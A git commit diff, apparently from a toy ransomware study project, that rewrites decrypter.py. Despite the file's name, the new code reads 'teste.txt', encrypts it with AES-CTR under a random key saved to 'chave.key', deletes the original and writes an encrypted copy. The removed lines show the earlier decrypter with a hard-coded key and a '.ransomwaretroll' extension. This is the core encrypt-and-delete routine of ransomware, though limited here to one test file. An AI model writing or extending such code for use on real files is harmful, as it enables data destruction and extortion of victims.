e9fd5fe4e101b6eb9ffe03dfd407265ee6137da9
Santiago Castrillon <50801625+san2003@users.noreply.github.com>
2025-01-29 19:40:11 -0300

    Update decrypter.py
    Incrementando a geração aleatória de chave, com a criação de um arquivo.key

--- decrypter.py
+++ decrypter.py
@@ -1,22 +1,30 @@
 import os
 import pyaes
+import secrets
 
-## abrir o arquivo criptografado
-file_name = "teste.txt.ransomwaretroll"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+# Abrir o arquivo original
+file_name = "teste.txt"
+with open(file_name, "rb") as file:
+    file_data = file.read()
 
-## chave para descriptografia
-key = b"testeransomwares"
+# Gerar uma chave de 16 bytes (128 bits) e salvar em um arquivo
+key = secrets.token_bytes(16)
+with open("chave.key", "wb") as key_file:
+    key_file.write(key)
+
+# Inicializar AES no modo CTR
 aes = pyaes.AESModeOfOperationCTR(key)
-decrypt_data = aes.decrypt(file_data)
 
-## remover o arquivo criptografado
+# Criptografar os dados
+crypto_data = aes.encrypt(file_data)
+
+# Remover o arquivo original
 os.remove(file_name)
 
-## criar o arquivo descriptografado
-new_file = "teste.txt"
-new_file = open(f'{new_file}', "wb")
-new_file.write(decrypt_data)
-new_file.close()
+# Criar o arquivo criptografado
+encrypted_file_name = f"{file_name}.enc"
+with open(encrypted_file_name, "wb") as new_file:
+    new_file.write(crypto_data)
+
+print(f"Arquivo criptografado salvo como: {encrypted_file_name}")
+print(f"Chave de descriptografia salva em: chave.key")
